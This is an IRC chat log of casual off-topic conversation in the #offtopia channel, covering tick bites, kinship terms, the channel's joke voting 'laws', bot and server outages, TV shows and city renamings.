Jun 19 10:46:13 <nanovad>	shikhin: Personally I wouldn't go to the doctor for a tick bite because of $$$, but that's just me personally. If you can, I'd do it. I think the only real disease carried by ticks is lyme, and that's pretty obvious when you start to show symptoms.
Jun 19 10:46:47 <shikhin>	olsner: Right, hm, except I read somewhere that: a) it doesn't always show, and b) can take up to 30 days (it's been 10 now, no ring, but I'll forget if I decide not to doctor).
Jun 19 10:47:07 <olsner>	TBE is scarier, but I think pretty rare and only carried by ticks in certain areas
Jun 19 10:47:48 <S_Gautam>	that reminds me once a rabid dog bit my Dad's driver and he went to a tantrik to get himself rid of rabies

Jun 19 10:48:47 <S_Gautam>	well, my dad asked him to get to the nearest city and get vaccination
Jun 19 10:48:50 <olsner>	shikhin: I think you'd know that specifically if you did
Jun 19 10:49:10 <S_Gautam>	he still probably believes that it was the tantrik

Jun 20 02:01:21 <S_Gautam>	i mean, yes, in the long term, we need to get rid of these social constraints that disadvantage groups of people. But, it's difficult, don't you agree? When someone puts on their dating profile "Only 6'+", i don't think we have any right to criticize them, it's their choice.
Jun 20 02:01:53 <S_Gautam>	i'm also saying this because I'm not 6'+ myself, and it's kind of off-putting at times lol
Jun 20 02:01:56 <shikhin>	Er, it's certainly not the case that someone born short can't function in society, so I don't get the urgency of resorting to modifying genes?

Jun 20 02:23:12 <nortti>	the online dictionary by KOTUS says lanko is the brother of your spouse, the husband of your sibling, or the husband of your spouse's sibling

Jun 20 02:29:51 <nortti>	oh, didn't notice
Jun 20 02:30:40 <nortti>	honestly, I'd say the in-law kinship terms (except for anoppi, due to the "nagging mother-in-law") are disappearing from finnish
Jun 20 02:33:07 <FireFly>	"The shortest kinship description problem" :D
Jun 20 02:34:56 <nortti>	{mother, father, parent, sister, brother, sibling, boy/son, daughter, child} are all alive and well as are the big- and little- variants of sibling terms and (great)grand- variants of parentage/child terms. {aunt, uncle (maternal), uncle (paternal)} are doing well as well, but I personally don't really use them. their great-* variants are rarer. {(first) cousin, second cousin} are used, third cousin 
Jun 20 02:35:02 <nortti>	onwards it rarer.
Jun 20 02:37:21 <zgrep>	That video doesn't get into sibling's children.
Jun 20 02:37:35 <shikhin>	That's incest?
Jun 20 02:37:52 *	shikhin goes away.
Jun 20 02:38:46 <FireFly>	I guess the one we use would be considered Inuit by these labels, even if it's not strictly that (because we do differ between aunt-on-mum's-side and aunt-on-dad's-side, same for uncle)
Jun 20 02:38:59 <FireFly>	also grandma/grandpa on each side
Jun 20 02:39:11 <FireFly>	*however*, we do still just use "cousin" for all cousins on that level
Jun 20 02:39:27 <FireFly>	It's.. a bit in-between inuit and sudanese?
Jun 20 02:39:54 <nortti>	right, these categorizations are never 100% exact
Jun 20 02:40:31 <FireFly>	Yeah

Jun 20 02:41:07 <FireFly>	I wonder if we aren't closer to sudanese actually
Jun 20 02:43:28 <FireFly>	or well.. I guess we do apply categories but we do distinguish between different sides (above the "siblings/cousins" level)
Jun 20 02:43:36 <nortti>	zgrep: there's a thing in linguistics, called prototype theory. it posists that meaning of words isn't based on some definition that an object needs to fulfill in order to be called that word, but rather a prototype that one compares it against. if a thing is closest to prototype for word X, it is X, even if it might not fully fit the prototype. the things presented in the video are prototypes, not lists 
Jun 20 02:43:42 <nortti>	of requirements
Jun 20 02:43:57 <FireFly>	there's also the bit where the terms themselves are generally compound words instead of unique separate words, but I feel that's just a linguistic point and not a kinship one
Jun 20 02:44:27 <FireFly>	nortti: hm interesting
Jun 20 02:46:42 <S_Gautam>	actually technically I'm a product of incest
Jun 20 02:47:17 <nortti>	hm?
Jun 20 02:47:48 <S_Gautam>	just after marriage was confirmed, the priest realized that my mother and Dad had the same "gothra" (a unit of family who owned the same cows in medieval and ancient India), and marriage between member of the same gothra is forbidden (since incest)
Jun 20 02:48:15 <nortti>	okay, that's kinda more general than "incest" as I understand it

Jun 20 03:00:43 <nortti>	well, it was formed by the allies after ww2, and has been a real conservative part of UN, so it makes sense european colonial powers that were not axis are overrepresented
Jun 20 03:01:29 <nortti>	they do have rotating representatives of other states, tho
Jun 20 03:02:09 <S_Gautam>	yes, but permanent membership now just seems kind of imperialist considering what has happened post 2001
Jun 20 03:02:38 <nortti>	I mean, it's always been kinda imperialist
Jun 20 03:03:15 <S_Gautam>	you could make a case for it in '45, since most countries at the time were being decolonized and there was a real need for the developed nations to lead the political discourse 
Jun 20 03:04:04 <S_Gautam>	i guess no country in the UNSC wants another country to get veto status
Jun 20 03:04:11 <nortti>	right
Jun 20 03:06:52 <nortti>	not completely unrelatedly, I used to think that veto-oikeus ‘right of veto’ was entirely-finnish, since veto is the nounification of vetää ‘to pull’, so it meant "the right to pull [away] a proposal"

Jun 20 03:21:53 <nortti>	if there is one ongoing
Jun 20 03:22:23 <shikhin>	Almost everything filibusters.
Jun 20 03:22:27 <zgrep>	Is :D: an official filibuster, or does it also count as a proposal?
Jun 20 03:22:36 <shikhin>	It doesn't count as a proposal.
Jun 20 03:23:01 <shikhin>	Hmmm.
Jun 20 03:23:14 <S_Gautam>	i feel like someone needs to write a book on this to document about how all this began
Jun 20 03:24:56 <nortti>	jesus, went to look up a the law about :D: and D: and for a small moment I thought I had been lawspeaking wrong and they did not filibuster, since the law just says 23:52 < FireFly> oh, re. what ybden just mentioned, I thought it'd be nice if we'd legislate corewise that messages that match a vote except with ':D:' or 'D:' in place of ':D' are to be ignored the same way that votes are, when resolving a 
Jun 20 03:24:57 <john_cephalopoda>	Huh, I thought :D: was a proposal.
Jun 20 03:25:02 <nortti>	reference to a message
Jun 20 03:25:10 <nortti>	but then I realized they are messages, and messages filibuster by default
Jun 20 03:25:21 <S_Gautam>	oh shit. I erased the wrong USB stick 
Jun 20 03:25:24 <shikhin>	Phew.
Jun 20 03:25:41 <nortti>	S_Gautam: welp, what was there?
Jun 20 03:25:56 <S_Gautam>	well, a lot of PDFs I downloaded over the course of 5-6 months
Jun 20 03:26:01 <S_Gautam>	and some notes
Jun 20 03:26:20 <S_Gautam>	i made a backup a month ago so i should be mostly fine
Jun 20 03:26:40 <S_Gautam>	now it has Debian on it
Jun 20 03:27:06 <shikhin>	S_Gautam: nortti and I (?) had an idea once to write a lengthier document on our history, but so far we just have http://offtopia.org/lawguide/lawguide.pdf.
Jun 20 03:27:06 <bslsk05>	​offtopia.org: application/pdf [143.83 kilobytes]
Jun 20 03:27:44 <S_Gautam>	yes i read that, that's like the summary of laws, but the history of offtopia is still shrouded in mystery
Jun 20 03:28:07 <S_Gautam>	from what I know this channel used to be #osdev-offtopic but then shifted to #offtopia for branding?
Jun 20 03:28:26 <FireFly>	nortti: oh, yeah, I think that only defines how ~ is treated
Jun 20 03:28:29 <shikhin>	It's all fairly straightforward. I mention ####asm in #osdev. nortti joins. We shift to #osdev-offtopic because I can't remember the name "####asm". sortie joins. More people join. Offtopia. We join #offtopia. You join.
Jun 20 03:29:21 <FireFly>	S_Gautam: mostly "we're not really associated with #osdev in any capacity, also technically this channel name is within #osdev's namespace"
Jun 20 03:29:28 <zgrep>	I just misread "doesn't mind being fun kicked" as "doesn't mind being fucked with".
Jun 20 03:29:53 <S_Gautam>	FireFly: did you come from #osdev ?
Jun 20 03:30:04 <FireFly>	I.. guess
Jun 20 03:30:15 <FireFly>	But I was never really terribly active in #osdev
Jun 20 03:30:19 <nortti>	me neither
Jun 20 03:30:26 *	shikhin used to be.
Jun 20 03:30:37 <john_cephalopoda>	s/with//zg
Jun 20 03:30:37 <bslsk05>	​<zgrep*> I just misread "doesn't mind being fun kicked" as "doesn't mind being fucked ".
Jun 20 03:31:04 <S_Gautam>	time to reboot now
Jun 20 03:31:06 *	S_Gautam has quit ()
Jun 20 03:31:08 <john_cephalopoda>	I spent the last four days compiling a source-based distro on my Raspberry Pi.
Jun 20 03:31:13 <nortti>	why?
Jun 20 03:31:35 *	zgrep doesn't see the point of singleing out bots in voting laws. Because I'd end up voting in such a way to avoid the bots / I see what bots say as valid proposals.
Jun 20 03:32:04 <john_cephalopoda>	nortti: Because most of the other distros available for the RasPi that I saw suck.
Jun 20 03:32:25 <shikhin>	zgrep: It helps because sometimes the bots might filibuster an ongoing vote.
Jun 20 03:32:28 <zgrep>	john_cephalopoda: Ah, you should've use my OS instead. It compiles nearly instantly, takes up essentially no space at all, and is secure by default.
Jun 20 03:32:36 <nortti>	john_cephalopoda: do you know if you can set up a distcc?
Jun 20 03:33:29 <john_cephalopoda>	nortti: I probably can. But once I have compiled every program it won't be too much hassle to compile the updates that trickle in, so I don't really mind much.
Jun 20 03:33:38 <john_cephalopoda>	zgrep: Linux only took 2 hours to compile.
Jun 20 03:33:56 <zgrep>	shikhin: Hm. I guess people could :D faster than 1 second. I find it unlikely that's what they were aiming to vote for in that case anyway...
Jun 20 03:34:21 <shikhin>	What're the edge cases? :D:, D:, nolog messages, automatic bot messages, joins/quits?
Jun 20 03:34:30 <shikhin>	nick changes?
Jun 20 03:34:40 <john_cephalopoda>	Nick changes can be a filibuster.
Jun 20 03:34:48 <nortti>	20:34 <@sortie> Proposal: For the three-`:D' legislation, network messages should be ignored (such as join, part, kill and nick messages), but not kicks or modes being set on users or any message intended to disrupt the legislative process.
Jun 20 03:34:50 *	shikhin is trying to make a fancy table.
Jun 20 03:34:59 <nortti>	20:53 <@sortie> Proposal: Automatic bot messages that explain a preceding message (translate it, dereference URLs, provide statistics, ....) shall be ignored for the purpose of law votes, rather than being considered filibusters (or votes).
Jun 20 03:36:01 *	zgrep . o O ( double zwsp protocol: one zwsp is ignored for voting, two zwsps are not. One zwsp is auto-responding bot, two zwsps is user-triggered. )
Jun 20 03:36:01 <nortti>	22:08 <@sortie> A disruptive nick change can be a proposal.
Jun 20 03:36:13 <shikhin>	Wait.
Jun 20 03:36:23 <shikhin>	What about disruptive joins, parts, or kills? D:
Jun 20 03:36:23 *	zgrep waits for shikhin.
Jun 20 03:36:23 <nortti>	18:56 <@sortie> By new ancient law, someone's first join is a proposal of existence. 
Jun 20 03:36:28 <nortti>	22:27 < nortti> By extension of "22:08 <@sortie> A disruptive nick change can be a proposal.", if a message that is generally to be ignored in legislative process (e.g. a join, automatic bot message) is disruptive, then it can be a proposal
Jun 20 03:36:32 <nortti>	shikhin: ^
Jun 20 03:36:35 <shikhin>	Ah.
Jun 20 03:36:51 <zgrep>	Hrmphlrphm.
Jun 20 03:36:52 <shikhin>	Wait.
Jun 20 03:36:53 <shikhin>	Hrm.
Jun 20 03:37:09 <shikhin>	A proposal is automatically a filibuster?
Jun 20 03:37:18 <nortti>	yes
Jun 20 03:37:21 <shikhin>	Ah.
Jun 20 03:37:35 <zgrep>	Well, at least we can still find out /if/ something was voted on, just not what it was, computer-aided-aly.
Jun 20 03:37:40 <nortti>	all proposals are a strict subset of filibusters
Jun 20 03:37:53 <zgrep>	class Filibuster:
Jun 20 03:37:56 <zgrep>	  pass
Jun 20 03:38:04 <zgrep>	class Proposal(Filibuster):

Jun 20 03:38:47 <nortti>	was something voted on?
Jun 20 03:38:50 <zgrep>	Well, fuck.
Jun 20 03:39:23 <zgrep>	We can find out if something was /potentially/ voted on!
Jun 20 03:39:39 *	zgrep wants eunomia to exist.

Jun 20 03:40:24 <shikhin>	That works?
Jun 20 03:41:06 <zgrep>	I think so.
Jun 20 03:42:53 <shikhin>	Hm, idea.
Jun 20 03:42:56 <zgrep>	lawguide.pdf should update who the lawrememberer is.
Jun 20 03:43:35 <zgrep>	john_cephalopoda: Well, my 0-byte os takes 0 seconds to compile! Its source is also its compiled code.
Jun 20 03:43:35 <shikhin>	Just a sec, once I'm done with this table.
Jun 20 03:44:24 <shikhin>	Hrm.
Jun 20 03:44:34 *	shikhin confused himself.
Jun 20 03:45:26 <shikhin>	That's wrong, right? Not sure how best to put this, but automatic bot messages can still be forceably voted on (e.g. bslsk05: :D) but D: or redacted messages can't?
Jun 20 03:46:01 <nortti>	wait, they can?
Jun 20 03:46:21 <shikhin>	Hm.
Jun 20 03:46:45 <zgrep>	I think so. I mean, they have been...
Jun 20 03:46:47 <shikhin>	I guess technically only if they're "disruptive", but I don't think that's how we treat this in practice?
Jun 20 03:47:03 <nortti>	oh?
Jun 20 03:47:08 <zgrep>	Anything a person votes on shall, from now on, be considered disruptive.
Jun 20 03:47:12 <shikhin>	Oh no.
Jun 20 03:47:37 <zgrep>	Then we have cyclical definitions! Who doesn't want those?
Jun 20 03:48:10 <shikhin>	Hm.
Jun 20 03:48:15 <shikhin>	Is a sed result an automatic bot message?
Jun 20 03:48:29 <zgrep>	Technically, yes. Usually I'd say they're pretty disruptive too.
Jun 20 03:48:36 <shikhin>	Hmm.
Jun 20 03:49:09 <zgrep>	Also do we have anything about fixing spelling mistakes in laws? Because, if I say something, it gets voted on, and I sed it to fix spelling, I think the fixed variant gets recorded.p.
Jun 20 03:49:20 <zgrep>	 s/p\./../
Jun 20 03:49:33 <nortti>	no, that's quotes
Jun 20 03:54:17 <nortti>	btw, I updated the lawguide
Jun 20 03:55:44 <shikhin>	I should probably add this table to the lawguide, maybe, as an appendix.
Jun 20 03:55:54 <shikhin>	https://gist.github.com/shikhin/f66bde02f37bcbd39ad109defa2e27fe – I tried adding footnotes but failed.
Jun 20 03:59:48 <nortti>	shikhin: added missing timestamps to the laws
Jun 20 03:59:58 <shikhin>	Whee.
Jun 20 04:08:15 <shikhin>	https://gist.github.com/shikhin/f66bde02f37bcbd39ad109defa2e27fe There you go.
Jun 20 04:09:00 <john_cephalopoda>	Best insult ever: "You egomaniacal pair of shoes"
Jun 20 04:10:08 <nortti>	missing the timestamp on 00:57 < nortti> proposal: "nolog:" and "[nolog]" messages are to be treated like "D:", they filibuster but are not counted when resolving vote references
Jun 20 04:10:13 <nortti>	but yat
Jun 20 04:10:16 <nortti>	*yay
Jun 20 04:10:30 <shikhin>	Oh whoops.
Jun 20 04:10:48 <shikhin>	(Thought you meant the laws from this week.)
Jun 20 04:10:53 <john_cephalopoda>	"if a message that is generally to be ignored in legislative process" <-- Does that also apply to :D:?
Jun 20 04:11:17 <shikhin>	There, fixed.
Jun 20 04:11:48 <nortti>	john_cephalopoda: they are not ignored, they're just not proposals
Jun 20 04:12:28 <john_cephalopoda>	Ah, ok, since it isn't ignored but a filibuster.
Jun 20 04:12:33 <john_cephalopoda>	Makes sense.
Jun 20 04:13:17 <nortti>	hm, reminds me, did you read the readme on the lawgit? it now has info on how to add laws
Jun 20 04:13:26 <shikhin>	It's pretty good.
Jun 20 04:15:45 <john_cephalopoda>	Didn't read it yet.
Jun 20 04:20:13 <nortti>	added two small paragraphs to the start of it
Jun 20 04:21:39 <shikhin>	Don't know why this is bothering me, but why is the spacing between the "`[quote]` marks a […]" and "`[core]` marks a […]" line so odd?
Jun 20 04:21:58 <nortti>	…very good question
Jun 20 04:22:20 <nortti>	I … do not know?
Jun 20 04:22:28 <shikhin>	Hehe.
Jun 20 04:23:35 <nortti>	for whatever reason there is no empty line in the source between the two, but there is between all others
Jun 20 04:29:44 <nortti>	shikhin: couldn't make that layout work, so added explanatory labels to break it up instead
Jun 20 04:30:16 *	shikhin nods.
Jun 20 04:30:22 *	shikhin is going to go with "markdown bug".
Jun 20 04:30:50 <shikhin>	"I give up" Haha.
Jun 20 04:33:16 <john_cephalopoda>	I want to log system performance (RAM usage, processor %, network up/down). Do you know any good tools that can do that?
Jun 20 04:33:28 <shikhin>	Dad wants to typeset some of his college assignments in LaTeX. Asks me to help him, I give him a link to the wikibooks thing on LaTeX. Fifteen minutes later, he's deep in the wiki page on turing machines.
Jun 20 04:33:38 <nortti>	:D
Jun 20 04:33:45 <john_cephalopoda>	:D
Jun 20 04:34:12 <shikhin>	:D
Jun 20 04:36:08 <john_cephalopoda>	Would it make sense to handle quotes and laws seperately?
Jun 20 04:36:19 <shikhin>	How do you mean?
Jun 20 04:36:52 <shikhin>	We do have #addquote for things that don't pass a triminority.
Jun 20 04:37:08 <john_cephalopoda>	Things that are just legislated quotes would go to osdev-offtopic-quotes while things that are legislated law would go to osdev-offtopic-laws
Jun 20 04:37:29 <shikhin>	Ah, there is http://ayu.smar.fi:7070/offtopia-law/corelaws.text
Jun 20 04:37:34 <bslsk05>	​ayu.smar.fi <timeout>
Jun 20 04:37:39 <shikhin>	Which is automatically generated, as far as I know?
Jun 20 04:37:48 <shikhin>	Er, http://ayu.smar.fi:7070/0/offtopia-law/laws.text
Jun 20 04:39:03 <john_cephalopoda>	I propose shikhin adds the last legislated quote.
Jun 20 04:40:26 <shikhin>	Oh, I already added it a while back.
Jun 20 04:40:57 <john_cephalopoda>	Ah, good.
Jun 20 04:40:58 <nortti>	laws.text is a symlink to the lawlog file, corelaws is autogenned from it
Jun 20 04:41:20 <nortti>	laws get pulled twice an hour, :20 and :50
Jun 20 04:41:32 <shikhin>	Why those times?
Jun 20 04:41:51 <nortti>	wait, no, :10 and :40
Jun 20 04:42:30 <nortti>	because I wante it to be bihourly, but not fall on the usual :00 and :30
Jun 20 04:42:40 <shikhin>	Ah, hehe.
Jun 20 04:42:40 *	oonbotti2 has quit (Ping timeout: 260 seconds)
Jun 20 04:42:46 *	zgrep has quit (Remote host closed the connection)
Jun 20 04:42:48 <nortti>	welp, there goes ahti
Jun 20 04:42:55 <shikhin>	Uh oh.
Jun 20 04:43:29 <nortti>	wait, hm, I can ssh there?
Jun 20 04:43:42 <shikhin>	gogs works too.
Jun 20 04:43:42 <john_cephalopoda>	In my opinion, it's a bit complicated when 3+ people have to coordinate who adds the law. I propose that the first one to vote on the law is the one to add it, except when an other consensus is found. (Having the last one adding it is impossible since everybody can vote on already legislated laws at any point in the future.)
Jun 20 04:44:34 <nortti>	that was the original version of the proposal (except that the person could delegate themselves to anyone else who wanted, no need to get consensus)
Jun 20 04:44:51 <john_cephalopoda>	nortti: That's basically what I wanted to say with that.
Jun 20 04:44:53 <nortti>	since some people don't want to add laws or can't, we ended up scrapping that
Jun 20 04:45:06 <shikhin>	Right. There's no need to get consensus now, even––hopefully the first one to vote assumes responsibility. (I just added it now since I voted after a slight afk.)
Jun 20 04:45:20 <nortti>	right
Jun 20 04:45:54 <shikhin>	The other day I nominated you since you weren't added to the git––we'll probably be poking other people to when they are involved in voting for new laws from now on?
Jun 20 04:46:00 <john_cephalopoda>	It would make sense if the one who is going to add it says "I'll add it" so there aren't five people working on adding it at the same time.
Jun 20 04:46:37 <nortti>	right, there's supposed to be a bot that introduces a law's been committed, but, uh, problems with gogs
Jun 20 04:46:43 <john_cephalopoda>	Also + :D for poking people to be added to the law log.
Jun 20 04:46:59 <nortti>	but yeah, I agree it makes sense to go "I'll add"
Jun 20 04:47:43 <john_cephalopoda>	nortti: What does the bot run as? From what I saw it looks like it's trying to do some stuff in /var, which is probably not writable for everybody.
Jun 20 04:48:02 <shikhin>	Just you wait for my irssi script so I can type /law -3 [quote] "context here", and it automagically adds the last three lines with said context.
Jun 20 04:48:07 <nortti>	john_cephalopoda: ask vehk
Jun 20 04:48:24 <nortti>	shikhin: :D:
Jun 20 04:49:32 *	zgrep (~zgrep@ircpuzzles/2015/april-fools/sixth/zgrep) has joined
Jun 20 04:49:41 <shikhin>	Hi, zgrep. What broke?
Jun 20 04:51:16 <nortti>	hrm, o2 doesn't seem to be able to connect
Jun 20 04:51:35 <vehk>	john_cephalopoda: bot runs as law, in group law - there's a service for it (called law)
Jun 20 04:51:38 <nortti>	I wonder if we've hit the limit on number of things that can connect to freenode per host without identd
Jun 20 04:51:42 <shikhin>	vehk: :D
Jun 20 04:51:48 <shikhin>	vehk: Very subtle.
Jun 20 04:51:54 <vehk>	Anyway, gogs says 'exit status 1' for the git hook script, need to investigate

Jun 20 04:53:52 <shikhin>	You and oonbotti2.
Jun 20 04:54:02 <zgrep>	So ahti broke.
Jun 20 04:54:18 <nortti>	and now can't get hynneflip to connect either D:

Jun 20 04:56:47 <nortti>	I'm confused
Jun 20 04:57:53 <vehk>	john_cephalopoda: I have the feeling I need to restart gogs so it picks up on having been added to the law group, but didn't want to do that
Jun 20 04:58:57 <john_cephalopoda>	vehk: Ah, yeah, probably. It's not really critical, can wait until the next maintenance period.
Jun 20 04:59:20 <vehk>	But also there is a really weird line in the hook log containing a tweet link that was passed as law
Jun 20 04:59:22 <vehk>	And I'm afraid.
Jun 20 04:59:36 <nortti>	oh?
Jun 20 04:59:42 <shikhin>	It's probably fine if you restart it now, I doubt gogs is that crucial a service.
Jun 20 04:59:45 <vehk>	It shouldn't be there...
Jun 20 04:59:57 <shikhin>	(Unless of course then you can't get it back up, like uh oonbotti and hynneflip.)
Jun 20 05:00:01 <vehk>	haha
Jun 20 05:00:06 <john_cephalopoda>	I'm afraid, Dave.
Jun 20 05:00:19 <nortti>	vehk: offtopia-law should reconnect, right?
Jun 20 05:00:25 <vehk>	Yeah
Jun 20 05:00:28 <vehk>	*should*
Jun 20 05:00:28 <nortti>	it hasn't

Jun 20 06:05:10 <john_cephalopoda>	Reminds me of some guy who lived in the USA and had a foreign second name. He didn't use the way that it was pronounced in the country the name came from but also not like it would be pronounced by people in the USA.

Jun 20 06:22:54 <vehk>	Why not do it cross? At least for huge things like cmake
Jun 20 06:23:29 <john_cephalopoda>	Because I'd have to set up a cross-compile toolchain and I am lazy.

Jun 20 10:22:30 <olsner>	IIRC there is some kind of support for peer-to-peer PCI access, I wonder if all GPUs have that and how you e.g. decide which cards can talk to each other (just a few of the small problems to figure out after you get your own code running on the gpu)

Jun 20 10:47:31 <nortti>	any personal projects?
Jun 20 10:47:44 <shikhin>	What were the linguistics courses on?
Jun 20 10:47:55 <pecan>	the first one was Semantics and Pragmatics, that course was amazing
Jun 20 10:47:59 <pecan>	the second one was translation and I hated it
Jun 20 10:48:07 <pecan>	well, I liked it. but I also hated it.
Jun 20 10:48:10 <shikhin>	Haha.
Jun 20 10:48:50 <pecan>	not really any interesting personal projects, I was hacking around with a simple kernel in ATS (I haven't gotten too far) and a GPU-based text renderer

Jun 20 10:51:50 <s_gautam>	shikhin: did you watch those Japani shows on TV as a kid?
Jun 20 10:52:07 <shikhin>	Like?
Jun 20 10:52:08 <s_gautam>	shinchan, doraemon, kiteretsu, 
Jun 20 10:52:17 <s_gautam>	to others as well
Jun 20 10:52:23 <s_gautam>	ninja hattori 
Jun 20 10:52:43 <shikhin>	Somewhat, yep, English dubs. I also used to watch a Hindi dub of Takeshi's Castle.
Jun 20 10:52:50 <s_gautam>	oh yeah Takeshi's castle
Jun 20 10:53:22 <s_gautam>	i guess they don't have much Indian material to air so they just air possibly outdated (and out of copyright) shows from Japan
Jun 20 10:53:36 <nortti>	eh, likely not out of copyright
Jun 20 10:53:39 <shikhin>	Apparently "The show has become a cult television hit around the world."
Jun 20 10:53:50 <nortti>	but older stuff has lower licensing fees usually
Jun 20 10:54:11 <s_gautam>	hm, true. The doraemon episodes I watched in 2000s were from the 1980s
Jun 20 10:54:20 <s_gautam>	TV Asahi or something
Jun 20 10:54:34 <shikhin>	Weren't they just on Cartoon Network?
Jun 20 10:55:13 <s_gautam>	i think Cartoon Network mostly hosts American/European shows
Jun 20 10:55:22 <s_gautam>	Hungama hosts the old Japani shows
Jun 20 10:55:27 <shikhin>	Ah.
Jun 20 10:56:14 <s_gautam>	in all honesty, the homebrew Indian TV shows for kids are just.. eh
Jun 20 10:56:26 <s_gautam>	it's boring as fuck.
Jun 20 10:56:48 <shikhin>	Never seen it myself, but Shaktimaan is quite popular?
Jun 20 10:57:18 <s_gautam>	Shaktimaan is 1990s and early 2000s
Jun 20 10:57:21 <s_gautam>	i think
Jun 20 10:57:21 <shikhin>	I remember watching https://en.wikipedia.org/wiki/Hatim_(TV_series), it wasn't boring.

Jun 20 11:08:49 <vehk>	<nortti> I don't remember where I read it (I think it might have been some real old forum comment before the official timeline was releazed) that said sth to the effect that trying to find a timeline doesn't make sense, it's "the legend of zelda": one legend that is told in several different ways <- Mh, that is a reasonable stance to take
Jun 20 11:08:56 <nanovad>	I spent all day thinking about what to do next on democracyd, as soon as I loaded my editor I lost all motivation
Jun 20 11:09:05 <vehk>	What I'd be interested in is whether Nintendo actually cared about any of this before the official timeline or not
Jun 20 11:09:10 <vehk>	I don't really think they did
Jun 20 11:09:34 <vehk>	And it seems somewhat superfluous in that sense to actually give an account of an official timeline
Jun 20 11:10:00 <vehk>	I bet the idea for Hyrule Warriors was not that story, but in a metting someone actually noticed and said: "Wait, shit, we have an official timeline now. How do we even do this?"
Jun 20 11:10:20 <vehk>	And since it's weird to say that just for Hyrule Warriors there is none, they /had to/ make something up
Jun 20 11:10:40 <vehk>	Since if that game had no correlation to any other games, then why did some other weird entries in the franchise have that connection?
Jun 20 11:10:56 <vehk>	Once you have such an official stance on a theory, say, it's either you do it fully, or not at all
Jun 20 11:11:23 <vehk>	Everything else diminishes credibility, or just makes fans get their own theories again, which Nintendo would want a stance on?
Jun 20 11:11:34 <s_gautam>	tfw you don't have a Page Up key but then realize that
Jun 20 11:11:37 <s_gautam>	It's Fn+Up
Jun 20 11:11:46 <vehk>	I don't really care about the in-lore explanation of this, I think it sounds a bit weak.
Jun 20 11:12:07 <vehk>	But what I do care about is that Nintendo saw a need to make the game agree with the timeline in the franchise
Jun 20 11:12:16 <vehk>	With what is just not more than a mash-up of different characters
Jun 20 11:12:30 <vehk>	It's like the game exists outside the space they forced it in
Jun 20 11:13:56 <vehk>	Nowdays I personally choose to ignore anything on the timelines, I think they're just still a bit of hogwash
Jun 20 11:14:16 <vehk>	Just as I ignore certain things in the Final Cut of Blade Runner, because why the fuck would Deckard be a replicant
Jun 20 11:14:27 <shikhin>	"Chief among the bad ideas is the “Right to Be Forgotten.”  
Jun 20 11:14:27 <shikhin>	The right to remember is, in many ways, even more fundamental than the right to free speech.
Jun 20 11:14:37 <shikhin>	…okay.
Jun 20 11:14:45 <s_gautam>	have we reached that level of techonology yet
Jun 20 11:14:49 <s_gautam>	"Right to Remember"
Jun 20 11:15:00 <shikhin>	That's what this article is advocating for to be the case in the US.
Jun 20 11:15:17 <shikhin>	"The only reason that the right to free memory isn’t in the Constitution is that it would have never occurred to the Founding Fathers that the right to memory was a possibly practical issue."
Jun 20 11:15:22 <s_gautam>	i mean once euroscience develops we could erase human memoories
Jun 20 11:15:37 <s_gautam>	like, we might already have that capability 
Jun 20 11:15:50 <s_gautam>	*neuroscience
Jun 20 11:16:40 <s_gautam>	I *guess* something liek that could be useful especially in treating PTSD/trauma victims, although i'm not sure if erasing those memories is enough to reduce mental stress
Jun 20 11:17:27 <shikhin>	"The Right to Message Delivery […] There are now layers of service providers sitting in the middle of all messaging mediums and deciding which messages to pass through and which to block.
Jun 20 11:17:31 <shikhin>	This comes from a good place—an attempt to limit spam and scams. But the ability to block certain people from sending messages to other people leaves the world in a dangerous place."

Jun 20 11:22:44 <s_gautam>	i don't get the paragraph? is the author referring to the anti-nazi laws in europe that's seen as "anti-free speech"?
Jun 20 11:23:31 <shikhin>	No it's just a silly "look, you went through a terrible thing and so 'forgetting things' is on your mind and so you want a right to be forgotten".
Jun 20 11:23:38 <vehk>	I think the author is speaking out of their own ass and actually have no clue what they're saying so they have to make up stupid shit
Jun 20 11:24:18 <vehk>	If that is the case, it honestly speaks volumes about how someone would choose to forget something like the holocaust

Jun 20 11:33:45 <shikhin>	vehk: Yeah, somewhat annoying when it's compared to asking actual individuals to forget you exist.
Jun 20 11:33:51 <vehk>	Like, you could argue that once you steal something from a shop, every shop owner ever should hold a grudge?

Jun 20 11:35:44 <vehk>	Don't you just hate it when you read a paragraph of text and it suddenly moves to the left?
Jun 20 11:35:52 <s_gautam>	yes
Jun 20 11:35:55 <s_gautam>	fucking marquee
Jun 20 11:36:00 <s_gautam>	markque?
Jun 20 11:36:04 <vehk>	That's not marquee, it's worse than that even
Jun 20 11:36:10 <vehk>	There's no pause with marquee.
Jun 20 11:36:16 <vehk>	This one tricks you
Jun 20 11:36:50 <s_gautam>	i honestly have no idea why do so many Indian websites use marquee

Jun 20 11:37:08 <s_gautam>	i think the biggest problem is the schools teaching marquee as a feature
Jun 20 11:37:55 <s_gautam>	like, just have a long static list that doesn't keep moving, I don't want to feel like I'm searching for my coach while the train is about to leave when I just want to browse the website
Jun 20 11:38:08 <shikhin>	I love how it says "Designed by Webgener Infosystem" with a link, but the link doesn't work.
Jun 20 11:39:31 <john_cephalopoda>	shikhin: This is flawless design. It forces you to not waste time looking at the boring site of the guys who designed that stuff.

Jun 20 11:43:24 <s_gautam>	(apparently, due to communist presence near that region, it has been nicknamed as the Leningrad of Bihar)
Jun 20 11:45:53 <john_cephalopoda>	s_gautam: Maybe they changed the name to "Prayaygraj" because they knew some guy called Jay who married a man and just adopted a child and therefore they made the city name an anagram of "gay pa jarry".

Jun 20 11:46:10 <s_gautam>	hm good theory
Jun 20 11:46:36 <s_gautam>	i guess they weren't bullshiting when they said Germans make good theoretical physicists 
Jun 20 11:46:50 <john_cephalopoda>	s_gautam: At least in theory that's true.
Jun 20 11:48:06 <s_gautam>	shikhin: in all honestly, most people are not going to call Allahabad to Pryayayaraj or whatever, almost everyone knows that place has Illahabad
Jun 20 11:48:44 <shikhin>	Doesn't seem to be true, apparently it's known to locals as "Prayāg".
Jun 20 11:49:01 <s_gautam>	is it? huh, interesting.
Jun 20 11:49:23 <s_gautam>	I have never heard Prayag before, until I saw the news.
Jun 20 11:49:27 <shikhin>	Me neither.
Jun 20 11:50:00 <shikhin>	Might just be propaganda, I dunno, that's what I'm reading in a lot of places. At least it's most definitely a historical name, not something they pulled out of their arse (which they're quite capable of).
Jun 20 11:50:18 <john_cephalopoda>	The four first letters say "Pray", the first three letters backwards say "gay". I think that's a sign.
Jun 20 11:50:37 <s_gautam>	Pray the gay away?
Jun 20 11:50:40 <s_gautam>	that's a thing you know
Jun 20 11:51:03 <john_cephalopoda>	s_gautam: Pray in the front (of the church) and gay from behind.

Jun 20 11:52:47 <vehk>	I hate alcohol and people.
